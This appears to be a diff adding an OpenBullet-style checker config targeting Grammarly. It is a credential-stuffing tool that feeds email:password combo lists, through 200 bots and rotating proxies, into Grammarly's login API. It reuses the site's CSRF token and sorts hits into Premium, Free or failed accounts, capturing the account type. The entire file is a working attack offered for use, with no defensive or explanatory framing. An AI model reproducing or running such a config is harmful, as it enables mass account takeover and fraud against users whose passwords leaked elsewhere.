@@ -1,0 +1,88 @@
+[SETTINGS]
+{
+  "Name": "GRAMMARLY",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2020-03-17T23:19:20.7638505-04:00",
+  "AdditionalInfo": "",
+  "Author": "0w0",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.grammarly.com/signin" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "dnt: 1" 
+  HEADER "upgrade-insecure-requests: 1" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<ADDRESS>" DoesNotContain "www.grammarly.com" 
+    KEY "<RESPONSECODE>" DoesNotContain "200" 
+
+REQUEST POST "https://auth.grammarly.com/v3/api/login" 
+  CONTENT "{\"email_login\":{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"secureLogin\":false}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "DNT: 1" 
+  HEADER "Origin: https://www.grammarly.com" 
+  HEADER "Referer: https://www.grammarly.com/signin" 
+  HEADER "X-CSRF-Token: <COOKIES(csrf-token)>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"error\":\"FAILURE\"}" 
+    KEY "error" 
+  KEYCHAIN Success OR 
+    KEY "type\":\"Premium\",\"" 
+    KEY "lastname" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "type\":\"Free\",\"" 
+
+PARSE "<SOURCE>" LR "\"type\":\"" "\"" -> CAP "Account Type" 
+
